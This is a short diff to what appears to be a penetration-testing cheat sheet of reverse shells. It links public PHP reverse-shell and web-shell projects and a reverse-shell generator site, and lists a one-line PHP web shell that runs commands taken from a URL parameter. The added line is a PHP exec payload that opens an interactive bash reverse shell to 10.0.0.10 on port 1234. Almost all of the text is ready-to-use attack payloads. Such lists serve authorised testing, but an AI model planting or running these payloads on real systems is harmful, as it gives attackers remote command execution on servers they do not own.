@@ -8,6 +8,7 @@
 
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 	- `<?php system($_GET["cmd"]) ?>`
+   	- `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");`
         - [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
    	
 - https://www.revshells.com/
